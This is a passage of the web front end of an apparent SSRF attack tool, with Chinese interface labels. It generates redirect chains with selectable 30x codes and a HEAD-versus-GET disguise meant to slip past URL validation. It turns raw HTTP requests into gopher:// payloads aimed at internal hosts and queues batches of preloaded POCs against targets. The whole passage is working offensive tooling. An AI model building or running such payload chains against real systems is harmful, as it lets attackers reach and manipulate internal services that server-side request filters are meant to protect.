                        <button class="btn btn-warning btn-small" onclick="quickSetup()">⚡ 快捷(1+1)</button>
                        <button class="btn btn-danger" onclick="document.getElementById('statelessStepsContainer').innerHTML=''; stepCount=0;">清空</button>
                    </div>

                    <div id="statelessStepsContainer"></div>
                    
                    <button class="btn" onclick="generateStatelessChain()" style="margin-top: 14px;">🚀 生成链式 Payload</button>
                </div>

                <!-- 有状态路径隐藏链 Tab -->
                <div id="tab-stateful" class="tab-content">
                    <div class="protocol-tip">
                        <b>有状态路径隐藏链：</b> URL中无编码参数，自定义短路径逐级跳转。支持批量队列模式：每次请求依次响应不同POC。
                    </div>
                    <div class="head-bypass-toggle" onclick="document.getElementById('hbStatefulCheck').click();">
                        <input type="checkbox" id="hbStatefulCheck" onclick="event.stopPropagation();">
                        <span class="toggle-label">🔀 启用 HEAD 伪装绕过 (全链)</span>
                        <span class="toggle-desc">所有节点HEAD→200, GET/POST→30x</span>
                    </div>

                    <div style="margin-bottom: 16px; display: flex; gap: 10px;">
                        <button class="btn btn-secondary btn-small" onclick="addStatefulStep(false)">+ 中转节点</button>
                        <button class="btn btn-small" onclick="addStatefulStep(true)">+ 终点节点</button>
                        <button class="btn btn-danger" onclick="document.getElementById('statefulStepsContainer').innerHTML=''; statefulStepCount=0;">清空</button>
                    </div>

                    <div id="statefulStepsContainer"></div>

                    <div class="form-group" style="margin-top:20px;" id="finalTargetGroup" hidden>
                        <label>快捷POC</label>
                        <select id="statefulPocSelect"><option value="">-- 手动输入 --</option></select>
                        <label style="margin-top: 10px;">最终目标 URL</label>
                        <input type="text" id="statefulFinalTarget" placeholder="http://target.internal/service">
                        <button class="btn btn-warning btn-small" onclick="toggleStatefulEditor()" style="margin-top:10px;">✏️ 高级请求编辑</button>
                        <div class="dual-editor-layout" id="statefulDualEditor" style="display:none;">
                            <div class="req-editor" id="statefulReqEditor">
                                <label style="color:var(--accent);font-size:13px;margin-bottom:14px;display:block;">📝 结构化编辑</label>
                                <label>请求方法</label>
                                <select class="req-method">
                                    <option value="GET">GET</option>
                                    <option value="POST" selected>POST</option>
                                    <option value="PUT">PUT</option>
                                    <option value="DELETE">DELETE</option>
                                    <option value="OPTIONS">OPTIONS</option>
                                    <option value="HEAD">HEAD</option>
                                    <option value="PATCH">PATCH</option>
                                </select>
                                <label>Host</label>
                                <input type="text" class="req-host" placeholder="127.0.0.1:8080">
                                <label>路径</label>
                                <input type="text" class="req-path" placeholder="/api/v1/...">
                                <label>请求头</label>
                                <div class="req-headers" id="statefulReqHeaders"></div>
                                <button class="btn btn-ghost btn-small" onclick="addHeaderRow('statefulReqHeaders')" style="margin-bottom:10px;">+ 添加请求头</button>
                                <label>请求体</label>
                                <textarea class="req-body" placeholder="JSON或任意格式"></textarea>
                                <div style="display:flex;gap:8px;margin-top:8px;">
                                    <button class="btn btn-small" onclick="applyStatefulCustomRequest()">✅ 生成 Gopher Payload</button>
                                    <button class="btn btn-orange btn-small" onclick="syncStructuredToRaw('statefulReqEditor','statefulRawArea')">→ 同步到Raw</button>
                                </div>
                            </div>
                            <div class="raw-editor-panel" id="statefulRawPanel">
                                <div class="raw-title">
                                    <h4>🔧 Burp 风格 Raw 编辑器</h4>
                                    <button class="copy-raw-btn" onclick="copyRawEditorContent('statefulRawArea')">📋 复制</button>
                                </div>
                                <textarea class="raw-request-area" id="statefulRawArea" placeholder="粘贴或编辑原始HTTP请求..." spellcheck="false"></textarea>
                                <div class="raw-editor-btns">
                                    <button class="btn btn-orange btn-small" onclick="parseRawToStructured('statefulRawArea','statefulReqEditor')">← 解析到结构化</button>
                                    <button class="btn btn-small" onclick="rawToGopher('statefulRawArea','statefulFinalTarget')">✅ Raw → Gopher</button>
                                    <button class="btn btn-ghost btn-small" onclick="beautifyRawBody('statefulRawArea')">🎨 格式化Body</button>
                                </div>
                            </div>
                        </div>
                    </div>

                    <button class="btn" onclick="generateStatefulChain()" style="margin-top: 14px;">🔗 生成隐藏链</button>

                    <!-- 有状态链管理面板 -->
                    <div class="chain-manager">
                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:18px;">
                            <h3>📋 已构建的有状态链</h3>
                            <button class="manual-refresh-btn" onclick="refreshChains()">🔄 刷新</button>
                        </div>
                        <div id="chainListContainer">
                            <div class="no-chains-msg">暂无已构建的有状态链</div>
                        </div>
                    </div>
                </div>

                <div class="result-box" id="resultBox">
                    <h3 style="color:var(--accent-green);margin-bottom:10px;font-size:15px;">🎯 Payload URL:</h3>
                    <div class="payload-url" id="payloadUrl"></div>
                    <button class="copy-btn" onclick="copyPayload()">📋 复制</button>
                </div>
            </div>

            <!-- 右侧：日志面板 -->
            <div class="card">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:18px;">
                    <h2 style="margin:0; font-size: 1.15em;">📡 请求日志</h2>
                    <div style="display: flex; gap: 8px;">
                        <button class="btn btn-danger" onclick="clearAllLogs()">清空</button>
                        <button class="manual-refresh-btn" id="manualRefreshBtn">刷新</button>
                    </div>
                </div>
                <div class="logs-container" id="logsContainer">
                    <div style="text-align:center; padding:50px; color:var(--text-muted); font-size: 15px;">等待流量...</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const POCS = {{ poc_json|safe }};
        const QUEUE_PRESETS = {{ queue_presets_json|safe }};
        const BASE_URL = window.location.origin;
        let stepCount = 0;
        let statefulStepCount = 0;
        let hiddenLogIds = new Set();

        function escapeHtml(text) {
            if (!text) return '';
            return text.replace(/[&<>"']/g, function(m) {
                const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
                return map[m];
            });
        }

        function getStatusCodeOptions(selectedCode = '302') {
            const codes = [
                {code: '300', desc: 'Multiple Choices'},
                {code: '301', desc: 'Moved Permanently'},
                {code: '302', desc: 'Found (改GET)'},
                {code: '303', desc: 'See Other (强制GET)'},
                {code: '307', desc: 'Temporary Redirect (保留方法)'},
                {code: '308', desc: 'Permanent Redirect (保留方法)'}
            ];
            return codes.map(c => `<option value="${c.code}" ${c.code === selectedCode ? 'selected' : ''}>${c.code} - ${c.desc}</option>`).join('');
        }

        document.getElementById('statusCode').innerHTML = getStatusCodeOptions('302');

        // HEAD Bypass toggle
        function toggleHeadBypassConfig(section) {
            const checkbox = document.getElementById(`hb${capitalize(section)}Check`);
            const config = document.getElementById(`hb${capitalize(section)}Config`);
            if (config) {
                config.classList.toggle('show', checkbox.checked);
            }
        }
        function capitalize(s) { return s.charAt(0).toUpperCase() + s.slice(1); }

        let pocOptionsHtml = '<option value="" data-method="AUTO">-- 选择POC或手动输入 --</option>';
        const categories = {};
        POCS.forEach((poc) => {
            if (!categories[poc.category]) categories[poc.category] = [];
            categories[poc.category].push(poc);
        });
        for (const [cat, pocs] of Object.entries(categories)) {
            pocOptionsHtml += `<optgroup label="${cat}">`;
            pocs.forEach(p => { 
                pocOptionsHtml += `<option value="${p.payload}" data-method="${p.method || 'GET'}">[${p.method}] ${p.name}</option>`; 
            });
            pocOptionsHtml += `</optgroup>`;
        }

        document.getElementById('pocSelect').innerHTML = pocOptionsHtml;
        document.getElementById('pocSelect').addEventListener('change', function() { 
            const opt = this.options[this.selectedIndex];
            const target = opt.value;
            if (!target) return;
            document.getElementById('targetUrl').value = target;
            const method = opt.getAttribute('data-method');
            const matchedPoc = POCS.find(p => p.payload === target);
            if (matchedPoc) {
                handlePocSelectionForEditor(matchedPoc, 'basicReqEditor');
            }
            if (method && method !== 'GET' && target.startsWith('http://')) {
                document.getElementById('basicDualEditor').style.display = 'grid';
            } else if (method && method !== 'GET' && target.startsWith('https://')) {
                document.getElementById('statusCode').value = '307';
                alert(`已自动切换至 307 状态码 (${method} + HTTPS)`);
            }
        });

        document.getElementById('statefulPocSelect').innerHTML = pocOptionsHtml.replace('-- 选择POC或手动输入 --', '-- 手动输入 --');
        document.getElementById('statefulPocSelect').addEventListener('change', function() {
            const opt = this.options[this.selectedIndex];
            if (!opt.value) return;
            document.getElementById('statefulFinalTarget').value = opt.value;
            const matchedPoc = POCS.find(p => p.payload === opt.value);
            if (matchedPoc) {
                handlePocSelectionForEditor(matchedPoc, 'statefulReqEditor');
            }
        });

        function handlePocSelectionForEditor(poc, editorId) {
            const editor = document.getElementById(editorId);
            if (!editor) return;
            const method = poc.method || 'GET';
            editor.querySelector('.req-method').value = method;
            let host = '', path = '/';
            try {
                const url = new URL(poc.payload);
                host = url.host;
                path = url.pathname + url.search;
            } catch(e) {}
            editor.querySelector('.req-host').value = host;
            editor.querySelector('.req-path').value = path;
            const headersContainer = editor.querySelector('.req-headers');
            if (headersContainer) {
                headersContainer.innerHTML = '';
                addHeaderRowWithValues(headersContainer, 'Host', host);
                if (poc.headers && typeof poc.headers === 'object') {
                    for (const [key, value] of Object.entries(poc.headers)) {
                        addHeaderRowWithValues(headersContainer, key, value);
                    }
                }
                if (method === 'POST' || method === 'PUT' || method === 'PATCH') {
                    addHeaderRowWithValues(headersContainer, 'Content-Type', 'application/json');
                }
            }
            const bodyInput = editor.querySelector('.req-body');
            if (bodyInput) {
                bodyInput.value = poc.body || '';
                if (!poc.body && (method === 'POST' || method === 'PUT')) {
                    bodyInput.value = '{"ssrf_probe": "success"}';
                }
            }
            const rawAreaId = editorId === 'basicReqEditor' ? 'basicRawArea' : 'statefulRawArea';
            syncStructuredToRaw(editorId, rawAreaId);
        }

        document.querySelectorAll('.nav-tab').forEach(tab => {
            tab.addEventListener('click', function() {
                document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                this.classList.add('active');
                document.getElementById('tab-' + this.dataset.tab).classList.add('active');
                if (this.dataset.tab === 'stateful') refreshChains();
            });
        });

        function showResult(url) {
            document.getElementById('payloadUrl').textContent = url;
            document.getElementById('resultBox').classList.add('show');
        }

        function copyPayload() {
            const text = document.getElementById('payloadUrl').textContent;
            doCopy(text, '✅ 已复制!');
        }

        function doCopy(text, successMsg) {
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(text).then(() => alert(successMsg || '✅ 已复制!')).catch(() => fallbackCopyText(text, successMsg));
            } else { fallbackCopyText(text, successMsg); }
        }

        function fallbackCopyText(text, successMsg) {
            const ta = document.createElement("textarea");
            ta.value = text; ta.style.cssText = "position:fixed;top:0;left:0;opacity:0;";
            document.body.appendChild(ta); ta.focus(); ta.select();
            try { if(document.execCommand('copy')) alert(successMsg||'✅ 已复制!'); else alert('❌ 复制失败'); } catch(e) { alert('❌ 复制失败'); }
            document.body.removeChild(ta);
        }

        function generateBasicPayload() {
            const code = document.getElementById('statusCode').value;
            const target = document.getElementById('targetUrl').value.trim();
            if (!target) return alert('请输入目标URL');
            const hb = document.getElementById('hbBasicCheck').checked ? '1' : '0';
            let url = `${BASE_URL}/r?code=${code}&url=${encodeURIComponent(target)}`;
            if (hb === '1') {
                const hbStatus = document.getElementById('hbBasicStatus').value;
                const hbCt = document.getElementById('hbBasicContentType').value;
                const hbCl = document.getElementById('hbBasicContentLength').value;
                url += `&hb=1&hb_status=${hbStatus}&hb_ct=${encodeURIComponent(hbCt)}&hb_cl=${hbCl}`;
            }
            showResult(url);
        }

        function safeBase64UrlEncode(obj) {
            const jsonStr = JSON.stringify(obj);
            const utf8Bytes = encodeURIComponent(jsonStr).replace(/%([0-9A-F]{2})/g, function(match, p1) { return String.fromCharCode('0x' + p1); });
            const base64 = btoa(utf8Bytes);
            return base64.replace(/\\+/g, '-').replace(/\\//g, '_').replace(/=+$/, '');
        }

        function addHeaderRow(containerIdOrElement) {
            let container;
            if (typeof containerIdOrElement === 'string') { container = document.getElementById(containerIdOrElement); }
            else if (containerIdOrElement && containerIdOrElement.classList && containerIdOrElement.classList.contains('req-headers')) { container = containerIdOrElement; }
            else if (containerIdOrElement && containerIdOrElement.target) { const step = containerIdOrElement.target.closest('.step-item'); container = step ? step.querySelector('.req-headers') : null; }
            if (!container) return;
            const row = document.createElement('div'); row.className = 'header-row';
            row.innerHTML = `<input type="text" class="header-key" placeholder="Name"><input type="text" class="header-value" placeholder="Value"><button class="btn btn-danger btn-small" onclick="this.parentElement.remove()">✕</button>`;
            container.appendChild(row);
        }

        function addHeaderRowWithValues(container, key, value) {
            const row = document.createElement('div'); row.className = 'header-row';
            row.innerHTML = `<input type="text" class="header-key" value="${escapeHtml(key)}"><input type="text" class="header-value" value="${escapeHtml(value)}"><button class="btn btn-danger btn-small" onclick="this.parentElement.remove()">✕</button>`;
            container.appendChild(row);
        }

        function buildGopherFromEditor(editor) {
            const method = editor.querySelector('.req-method').value;
            const host = editor.querySelector('.req-host').value.trim();
            const path = editor.querySelector('.req-path').value.trim();
            const body = editor.querySelector('.req-body').value;
            if (!host) { alert('❌ 请填写 Host'); return null; }
            let req = `${method} ${path} HTTP/1.1\\r\\n`;
            let hasContentType = false;
            editor.querySelectorAll('.header-row').forEach(row => {
                const key = row.querySelector('.header-key').value.trim();
                const value = row.querySelector('.header-value').value.trim();
                if (key) { req += `${key}: ${value}\\r\\n`; if (key.toLowerCase() === 'content-type') hasContentType = true; }
            });
            if (!hasContentType && body && (method === 'POST' || method === 'PUT' || method === 'PATCH')) req += `Content-Type: application/json\\r\\n`;
            if (body) { req += `Content-Length: ${new Blob([body]).size}\\r\\n\\r\\n`; req += body; } else { req += `\\r\\n`; }
            let gopherPayload = encodeURIComponent(req).replace(/%20/g, ' ');
            let port = '80', hostname = host;
            if (host.includes(':')) { const parts = host.split(':'); hostname = parts[0]; port = parts[1]; }
            return `gopher://${hostname}:${port}/_${gopherPayload}`;
        }

        // ========== Burp-style Raw HTTP Editor Functions ==========
        function syncStructuredToRaw(editorId, rawAreaId) {
            const editor = document.getElementById(editorId);
            const rawArea = document.getElementById(rawAreaId);
            if (!editor || !rawArea) return;
            
            const method = editor.querySelector('.req-method').value;
            const host = editor.querySelector('.req-host').value.trim();
            const path = editor.querySelector('.req-path').value.trim() || '/';
            const body = editor.querySelector('.req-body').value;
            
            let rawText = `${method} ${path} HTTP/1.1\\n`;
            let hasHost = false;
            editor.querySelectorAll('.header-row').forEach(row => {
                const key = row.querySelector('.header-key').value.trim();
                const value = row.querySelector('.header-value').value.trim();
                if (key) {
                    rawText += `${key}: ${value}\\n`;
                    if (key.toLowerCase() === 'host') hasHost = true;
                }
            });
            if (!hasHost && host) rawText += `Host: ${host}\\n`;
            if (body) {
                rawText += `Content-Length: ${new Blob([body]).size}\\n`;
                rawText += `\\n${body}`;
            } else {
                rawText += `\\n`;
            }
            rawArea.value = rawText;
        }

        function parseRawToStructured(rawAreaId, editorId) {
            const rawArea = document.getElementById(rawAreaId);
            const editor = document.getElementById(editorId);
            if (!rawArea || !editor) return;
            
            const rawText = rawArea.value.trim();
            if (!rawText) { alert('❌ Raw请求内容为空'); return; }
            
            const parts = rawText.split(/\\n\\n/);
            const headerSection = parts[0];
            const bodySection = parts.slice(1).join('\\n\\n');
            
            const lines = headerSection.split('\\n');
            if (lines.length === 0) { alert('❌ 无法解析请求行'); return; }
            
            const requestLine = lines[0].trim();
            const reqMatch = requestLine.match(/^(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS|TRACE|CONNECT)\\s+(.+?)\\s+(HTTP\\/[\\d.]+)?$/i);
            if (!reqMatch) { alert('❌ 无法解析请求行: ' + requestLine); return; }
            
            const method = reqMatch[1].toUpperCase();
            const path = reqMatch[2];
            
            const headers = [];
            let host = '';
            for (let i = 1; i < lines.length; i++) {
                const line = lines[i].trim();
                if (!line) continue;
                const colonIdx = line.indexOf(':');
                if (colonIdx > 0) {
                    const key = line.substring(0, colonIdx).trim();
                    const value = line.substring(colonIdx + 1).trim();
                    headers.push({ key, value });
                    if (key.toLowerCase() === 'host') host = value;
                }
            }
            
            editor.querySelector('.req-method').value = method;
            editor.querySelector('.req-host').value = host;
            editor.querySelector('.req-path').value = path;
            
            const headersContainer = editor.querySelector('.req-headers');
            headersContainer.innerHTML = '';
            headers.forEach(h => {
                if (h.key.toLowerCase() !== 'content-length') {
                    addHeaderRowWithValues(headersContainer, h.key, h.value);
                }
            });
            
            editor.querySelector('.req-body').value = bodySection;
            alert('✅ 已解析到结构化编辑器');
        }

        function rawToGopher(rawAreaId, targetInputId) {
            const rawArea = document.getElementById(rawAreaId);
            const targetInput = document.getElementById(targetInputId);
            if (!rawArea) return;
            
            const rawText = rawArea.value.trim();
            if (!rawText) { alert('❌ Raw请求内容为空'); return; }
            
            const lines = rawText.split('\\n');
            let host = '';
            for (const line of lines) {
                const match = line.match(/^Host:\\s*(.+)$/i);
                if (match) { host = match[1].trim(); break; }
            }
            if (!host) { alert('❌ 请在请求中包含Host头'); return; }
            
            let rawRequest = rawText.replace(/\\r?\\n/g, '\\r\\n');
            if (!rawRequest.endsWith('\\r\\n')) rawRequest += '\\r\\n';
            
            const bodyIdx = rawRequest.indexOf('\\r\\n\\r\\n');
            if (bodyIdx !== -1) {
                const body = rawRequest.substring(bodyIdx + 4);
                const headerPart = rawRequest.substring(0, bodyIdx);
                const clRegex = /Content-Length:\\s*\\d+/i;
                let newHeader;
                if (clRegex.test(headerPart)) {
                    newHeader = headerPart.replace(clRegex, `Content-Length: ${new Blob([body]).size}`);
                } else if (body.length > 0) {
                    newHeader = headerPart + `\\r\\nContent-Length: ${new Blob([body]).size}`;
                } else {
                    newHeader = headerPart;
                }
                rawRequest = newHeader + '\\r\\n\\r\\n' + body;
            }
            
            let gopherPayload = encodeURIComponent(rawRequest).replace(/%20/g, ' ');
            let port = '80', hostname = host;
            if (host.includes(':')) { const parts = host.split(':'); hostname = parts[0]; port = parts[1]; }
            const gopherUrl = `gopher://${hostname}:${port}/_${gopherPayload}`;
            
            if (targetInput) { targetInput.value = gopherUrl; }
            alert('✅ Gopher Payload 已生成');
        }

        function beautifyRawBody(rawAreaId) {
            const rawArea = document.getElementById(rawAreaId);
            if (!rawArea) return;
            const rawText = rawArea.value;
            const parts = rawText.split(/\\n\\n/);
            if (parts.length < 2) { alert('未找到请求体'); return; }
            const headerPart = parts[0];
            const bodyPart = parts.slice(1).join('\\n\\n');
            try {
                const parsed = JSON.parse(bodyPart);
                const formatted = JSON.stringify(parsed, null, 2);
                rawArea.value = headerPart + '\\n\\n' + formatted;
            } catch(e) { alert('请求体不是有效的JSON格式'); }
        }

        function copyRawEditorContent(rawAreaId) {
            const rawArea = document.getElementById(rawAreaId);
            if (!rawArea) return;
            doCopy(rawArea.value, '✅ Raw请求已复制!');
        }

        function applyBasicCustomRequest() {
            const editor = document.getElementById('basicReqEditor');
            const gopherUrl = buildGopherFromEditor(editor);
            if (gopherUrl) { document.getElementById('targetUrl').value = gopherUrl; document.getElementById('basicDualEditor').style.display = 'none'; alert('✅ Gopher Payload 已生成'); }
        }

        function applyStatefulCustomRequest() {
            const editor = document.getElementById('statefulReqEditor');
            const gopherUrl = buildGopherFromEditor(editor);
            if (gopherUrl) { document.getElementById('statefulFinalTarget').value = gopherUrl; document.getElementById('statefulDualEditor').style.display = 'none'; alert('✅ Gopher Payload 已生成'); }
        }

        function toggleBasicEditor() { const e = document.getElementById('basicDualEditor'); e.style.display = e.style.display === 'none' ? 'grid' : 'none'; }
        function toggleStatefulEditor() { const e = document.getElementById('statefulDualEditor'); e.style.display = e.style.display === 'none' ? 'grid' : 'none'; }

        function autoFillEditor(step, pocData = null) {
            const urlInput = step.querySelector('.s-url');
            const hostInput = step.querySelector('.req-host');
            const pathInput = step.querySelector('.req-path');
            const headersContainer = step.querySelector('.req-headers');
            const bodyInput = step.querySelector('.req-body');
            const methodVal = pocData?.method || 'GET';
            let host = '', path = '/';
            try { const url = new URL(urlInput.value.trim()); host = url.host; path = url.pathname + url.search; } catch(e) {}
            if (hostInput) hostInput.value = host;
            if (pathInput) pathInput.value = path;
            if (headersContainer) {
                headersContainer.innerHTML = '';
                addHeaderRowWithValues(headersContainer, 'Host', host);
                if (pocData && pocData.headers) { for (const [key, value] of Object.entries(pocData.headers)) addHeaderRowWithValues(headersContainer, key, value); }
                if (methodVal === 'POST' || methodVal === 'PUT' || methodVal === 'PATCH') addHeaderRowWithValues(headersContainer, 'Content-Type', 'application/json');
            }
            if (bodyInput) { bodyInput.value = pocData?.body || ''; if (!bodyInput.value && (methodVal === 'POST' || methodVal === 'PUT')) bodyInput.value = '{"ssrf_probe": "success"}'; }
        }

        function applyMethodWrap(select) {
            const method = select.value;
            if (method === 'AUTO') return;
            const step = select.closest('.step-item');
            const urlInput = step.querySelector('.s-url');
            let urlStr = urlInput.value.trim();
            if (!urlStr) { alert('请先输入目标URL'); select.value = 'AUTO'; return; }
            if (urlStr.startsWith('http://')) { step.querySelector('.req-editor').style.display = 'block'; autoFillEditor(step); select.value = method; }
            else if (urlStr.startsWith('https://')) { alert('Gopher不支持HTTPS，请用307'); select.value = 'AUTO'; }
            else { alert('仅支持http://协议转Gopher'); select.value = 'AUTO'; }
        }

        function handlePocSelect(selectElement) {
            const option = selectElement.options[selectElement.selectedIndex];
            const step = selectElement.closest('.step-item');
            const urlInput = step.querySelector('.s-url');
            const codeSelect = step.querySelector('.s-code');
            urlInput.value = option.value;
            const pocData = POCS.find(p => p.payload === option.value);
            if (pocData && pocData.method !== 'GET') {
                if (option.value.startsWith('http://')) { step.querySelector('.req-editor').style.display = 'block'; autoFillEditor(step, pocData); step.querySelector('.s-method').value = pocData.method; }
                else if (option.value.startsWith('https://')) { codeSelect.value = '307'; }
            }
        }

        function toggleRequestEditor(btn) {
            const step = btn.closest('.step-item');
            const editor = step.querySelector('.req-editor');
            if (editor.style.display === 'none') { editor.style.display = 'block'; autoFillEditor(step); } else { editor.style.display = 'none'; }
        }

        function applyCustomRequest(btn) {
            const step = btn.closest('.step-item');
            const urlInput = step.querySelector('.s-url');
            const editor = step.querySelector('.req-editor');
            const gopherUrl = buildGopherFromEditor(editor);
            if (gopherUrl) { urlInput.value = gopherUrl; step.querySelector('.s-method').value = 'AUTO'; editor.style.display = 'none'; alert('✅ Gopher已生成'); }
        }

        function addStatelessStep(isFinal = false) {
            stepCount++;
            const borderColor = isFinal ? 'var(--accent-green)' : 'var(--accent)';
            const title = isFinal ? `终点 ${stepCount}` : `中转 ${stepCount}`;
            const defaultCode = isFinal ? '307' : '302';
            const html = `
                <div class="step-item stateless-step" style="border-left-color: ${borderColor};">
                    <div class="step-header">
                        <span class="step-title" style="color: ${borderColor};">${title}</span>
                        <button class="btn btn-danger" onclick="this.closest('.step-item').remove()">✖</button>
                    </div>
                    <div class="step-form">
                        <select class="s-code" style="margin-bottom:10px;">${getStatusCodeOptions(defaultCode)}</select>
                        <div class="step-input-group">
                            <select class="s-method" onchange="applyMethodWrap(this)" style="width:18%;background:rgba(63,185,80,0.08);color:var(--accent-green);border:1px solid rgba(63,185,80,0.25);font-size:13px;padding:12px 10px;">
                                <option value="AUTO">原样</option><option value="POST">→POST</option><option value="PUT">→PUT</option><option value="DELETE">→DEL</option>
                            </select>
                            <select class="s-poc" onchange="handlePocSelect(this)" style="width:30%;padding:12px 10px;font-size:13px;">${pocOptionsHtml}</select>
                            <input type="text" class="s-url" placeholder="目标URL" style="width:52%;font-family:'JetBrains Mono',monospace;font-size:13px;">
                        </div>
                        <button class="btn btn-warning btn-small" onclick="toggleRequestEditor(this)">✏️ 高级编辑</button>
                        <div class="req-editor" style="display:none;">
                            <label>方法</label><select class="req-method"><option value="GET">GET</option><option value="POST" selected>POST</option><option value="PUT">PUT</option><option value="DELETE">DELETE</option></select>
                            <label>Host</label><input type="text" class="req-host" placeholder="host:port">
                            <label>路径</label><input type="text" class="req-path" placeholder="/path">
                            <label>请求头</label><div class="req-headers"></div>
                            <button class="btn btn-ghost btn-small" onclick="addHeaderRow(this)" style="margin-bottom:10px;">+ 请求头</button>
                            <label>请求体</label><textarea class="req-body"></textarea>
                            <button class="btn btn-small" style="margin-top:8px;" onclick="applyCustomRequest(this)">✅ 生成Gopher</button>
                        </div>
                    </div>
                </div>`;
            document.getElementById('statelessStepsContainer').insertAdjacentHTML('beforeend', html);
        }
        
        function quickSetup() { document.getElementById('statelessStepsContainer').innerHTML = ''; stepCount = 0; addStatelessStep(false); addStatelessStep(true); document.querySelector('.stateless-step .s-url').value = BASE_URL; }
        quickSetup();

        function generateStatelessChain() {
            const steps = document.querySelectorAll('.stateless-step');
            if (steps.length === 0) return alert('请至少添加一个节点');
            let chainData = { s: [] }; let err = false;
            // HEAD bypass for stateless chain
            const hb = document.getElementById('hbStatelessCheck').checked;
            if (hb) chainData.hb = 1;
            
            steps.forEach((step, index) => {
                const c = parseInt(step.querySelector('.s-code').value);
                const urlInput = step.querySelector('.s-url');
                let t = urlInput.value.trim();
                if(!t && index < steps.length - 1) t = BASE_URL;
                if(!t){ err = true; urlInput.style.borderColor = 'var(--accent-red)'; } else { urlInput.style.borderColor = ''; chainData.s.push({c, t}); }
            });
            if(err) return alert('请完善目标URL');
            showResult(`${BASE_URL}/c?b=${safeBase64UrlEncode(chainData)}`);
        }

        function addStatefulStep(isFinal = false) {
            statefulStepCount++;
            const borderColor = isFinal ? 'var(--accent-green)' : 'var(--accent)';
            const title = isFinal ? `终点 ${statefulStepCount}` : `中转 ${statefulStepCount}`;
            const defaultCode = isFinal ? '307' : '302';
            const html = `
                <div class="step-item stateful-step" data-isfinal="${isFinal}" style="border-left-color: ${borderColor};">
                    <div class="step-header">
                        <span class="step-title" style="color: ${borderColor};">${title}</span>
                        <button class="btn btn-danger" onclick="this.closest('.step-item').remove(); syncFinalTargetVisibility();">✖</button>
                    </div>
                    <div class="step-form">
                        <input type="text" class="s-path" placeholder="/a (自定义路径)" style="margin-bottom:8px;">
                        <select class="s-code">${getStatusCodeOptions(defaultCode)}</select>
                    </div>
                </div>`;
            document.getElementById('statefulStepsContainer').insertAdjacentHTML('beforeend', html);
            syncFinalTargetVisibility();
        }

        function syncFinalTargetVisibility() {
            const finalSteps = document.querySelectorAll('.stateful-step[data-isfinal="true"]');
            document.getElementById('finalTargetGroup').hidden = finalSteps.length === 0;
        }

        async function generateStatefulChain() {
            const steps = document.querySelectorAll('.stateful-step');
            if (steps.length === 0) return alert('请至少添加一个节点');
            const finalTarget = document.getElementById('statefulFinalTarget').value.trim();
            const hasFinal = [...steps].some(s => s.dataset.isfinal === 'true');
            if (hasFinal && !finalTarget) return alert('请填写最终目标URL');
            const payload = { steps: [], final_target: hasFinal ? finalTarget : null, base_url: BASE_URL };
            
            // HEAD bypass
            const hb = document.getElementById('hbStatefulCheck').checked;
            if (hb) payload.head_bypass = true;
            
            let err = false;
            steps.forEach(step => {
                const path = step.querySelector('.s-path').value.trim();
                const code = parseInt(step.querySelector('.s-code').value);
                if (!path || !path.startsWith('/')) { step.querySelector('.s-path').style.borderColor = 'var(--accent-red)'; err = true; }
                else { step.querySelector('.s-path').style.borderColor = ''; payload.steps.push({ path, code }); }
            });
            if (err) return alert('路径必须以 / 开头');
            try {
                const res = await fetch('/api/create_stateful_chain', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
                const data = await res.json();
                if (data.error) alert('❌ ' + data.error); else { showResult(data.first_url); refreshChains(); }
            } catch(e) { alert('❌ 网络错误'); }
        }

        // ========== Queue Presets ==========
        function buildPresetButtons(chainId) {
            const presetKeys = Object.keys(QUEUE_PRESETS);
            return presetKeys.map(key => {
                const preset = QUEUE_PRESETS[key];
                return `<button class="preset-btn" data-preset="${key}" data-chain="${chainId}" onclick="applyPreset('${key}','${chainId}')" title="${preset.description}">${preset.name} (${preset.payloads.length})</button>`;
            }).join('');
        }

        function applyPreset(presetKey, chainId) {
            const preset = QUEUE_PRESETS[presetKey];
            if (!preset) return;
            const textarea = document.getElementById(`queue-input-${chainId}`);
            if (!textarea) return;
            
            const current = textarea.value.trim();
            if (current) {
                const choice = confirm(`当前队列已有内容。\\n\\n[确定] = 追加 (${preset.payloads.length}条)\\n[取消] = 替换`);
                if (choice) {
                    textarea.value = current + '\\n' + preset.payloads.join('\\n');
                } else {
                    textarea.value = preset.payloads.join('\\n');
                }
            } else {
                textarea.value = preset.payloads.join('\\n');
            }
            
            const btns = document.querySelectorAll(`button[data-chain="${chainId}"].preset-btn`);
            btns.forEach(b => b.classList.remove('active'));
            const activeBtn = document.querySelector(`button[data-preset="${presetKey}"][data-chain="${chainId}"]`);
            if (activeBtn) activeBtn.classList.add('active');
            
            const descEl = document.getElementById(`preset-desc-${chainId}`);
            if (descEl) {
                descEl.textContent = `✅ ${preset.name}: ${preset.description} (${preset.payloads.length}条已填充)`;
                descEl.classList.add('show');
            }
        }

        // ========== 有状态链管理 ==========
        async function refreshChains() {
            try {
                const res = await fetch('/api/stateful_chains');
                const data = await res.json();
                const container = document.getElementById('chainListContainer');
                const chains = data.chains || [];
                document.getElementById('chainCount').textContent = chains.length;
                if (chains.length === 0) { container.innerHTML = '<div class="no-chains-msg">暂无有状态链</div>'; return; }

                container.innerHTML = chains.map(chain => {
                    const stepsHtml = chain.steps.map((s, i) => `<span class="step-path">${escapeHtml(s.path)}</span><span style="color:var(--text-muted);">(${s.code}${i===chain.steps.length-1?' → 终点':''})</span>`).join(' → ');
                    const lastStep = chain.steps[chain.steps.length - 1];
                    const lastTarget = lastStep ? lastStep.target : '';
                    const firstUrl = `${BASE_URL}${chain.steps[0].path}`;
                    
                    const queue = chain.targets_queue || [];
                    const queueIndex = chain.queue_index || 0;
                    const queueMode = chain.queue_mode || 'sequential';
                    const hasQueue = queue.length > 0;
                    const headBypass = chain.head_bypass || false;

                    let headBypassBadge = headBypass ? '<span class="head-bypass-badge">🔀 HEAD伪装</span>' : '';

                    let queueHtml = '';
                    if (hasQueue) {
                        queueHtml = `
                            <div class="queue-status">
                                <span class="queue-badge queue-badge-active">● 队列模式</span>
